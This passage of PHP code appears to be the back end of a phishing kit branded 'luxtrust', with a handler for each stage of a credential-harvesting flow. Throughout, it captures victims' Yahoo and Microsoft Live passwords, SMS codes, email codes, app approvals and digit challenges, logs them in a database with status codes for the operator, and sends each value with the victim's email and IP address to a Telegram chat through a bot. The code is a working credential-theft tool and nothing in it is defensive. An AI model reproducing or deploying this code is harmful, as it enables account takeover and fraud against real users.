    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['ystart'])) {
        $ystart = mysqli_real_escape_string($conn, $_POST['ystart']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=351, buzzed=1, ystart='$ystart' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>yahoo verication:</b> <code>$ystart</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	




if ($_GET['type'] == 'yhpass') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['yhpass'])) {
        $yhpass = mysqli_real_escape_string($conn, $_POST['yhpass']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=353, buzzed=0, yhpass='$yhpass' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Yahoo Password:</b> <code>$yhpass</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'yhpasserror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['yhpass'])) {
        $yhpass = mysqli_real_escape_string($conn, $_POST['yhpass']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=355, buzzed=0, yhpass='$yhpass' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Yahoo Password Err:</b> <code>$yhpass</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	



if ($_GET['type'] == 'ydigt2') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['ydigt2'])) {
        $ydigt2 = mysqli_real_escape_string($conn, $_POST['ydigt2']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=357, buzzed=0, ydigt2='$ydigt2' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔢 <b>Yahoo 2 Digits:</b> <code>$ydigt2</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'yhsms') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['yhsms'])) {
        $yhsms = mysqli_real_escape_string($conn, $_POST['yhsms']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=359, buzzed=0, yhsms='$yhsms' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Yahoo SMS:</b> <code>$yhsms</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	

if ($_GET['type'] == 'yhsmserror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['yhsms'])) {
        $yhsms = mysqli_real_escape_string($conn, $_POST['yhsms']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=359, buzzed=0, yhsms='$yhsms' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Yahoo SMS Err:</b> <code>$yhsms</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}


if ($_GET['type'] == 'ymailc') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['ymailc'])) {
        $ymailc = mysqli_real_escape_string($conn, $_POST['ymailc']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=363, buzzed=0, ymailc='$ymailc' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔢 <b>Yahoo MailCode:</b> <code>$ymailc</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}


if ($_GET['type'] == 'ymailcerror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['ymailc'])) {
        $ymailc = mysqli_real_escape_string($conn, $_POST['ymailc']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=365, buzzed=0, ymailc='$ymailc' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔢 <b>Yahoo MailCode Err:</b> <code>$ymailc</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}


if ($_GET['type'] == 'yhapp') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['yhapp'])) {
        $yhapp = mysqli_real_escape_string($conn, $_POST['yhapp']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=367, buzzed=0, yhapp='$yhapp' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Yahoo APP:</b> <code>$yhapp</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	



if ($_GET['type'] == 'yhapperror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['yhapp'])) {
        $yhapp = mysqli_real_escape_string($conn, $_POST['yhapp']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=369, buzzed=0, yhapp='$yhapp' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Yahoo APP Err:</b> <code>$yhapp</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	

//Live action

if ($_GET['type'] == 'lstart') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['lstart'])) {
        $lstart = mysqli_real_escape_string($conn, $_POST['lstart']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=451, buzzed=1, lstart='$lstart' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Live verication:</b> <code>$lstart</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	



if ($_GET['type'] == 'lpass') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['lpass'])) {
        $lpass = mysqli_real_escape_string($conn, $_POST['lpass']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=453, buzzed=0, lpass='$lpass' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Live Password:</b> <code>$lpass</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}



if ($_GET['type'] == 'lpasserror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['lpass'])) {
        $lpass = mysqli_real_escape_string($conn, $_POST['lpass']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=455, buzzed=0, lpass='$lpass' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Live Password Err:</b> <code>$lpass</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}

if ($_GET['type'] == 'lnum') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['lnum'])) {
        $lnum = mysqli_real_escape_string($conn, $_POST['lnum']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=457, buzzed=0, lnum='$lnum' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔢 <b>Live 4 Digits:</b> <code>$lnum</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}




if ($_GET['type'] == 'lsms') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['lsms'])) {
        $lsms = mysqli_real_escape_string($conn, $_POST['lsms']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=459, buzzed=0, lsms='$lsms' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Live SMS:</b> <code>$lsms</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}


if ($_GET['type'] == 'lsmserror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['lsms'])) {
        $lsms = mysqli_real_escape_string($conn, $_POST['lsms']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=461, buzzed=0, lsms='$lsms' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Live SMS Err:</b> <code>$lsms</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}


if ($_GET['type'] == 'lmail') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['lmail'])) {
        $lmail = mysqli_real_escape_string($conn, $_POST['lmail']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=463, buzzed=0, lmail='$lmail' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

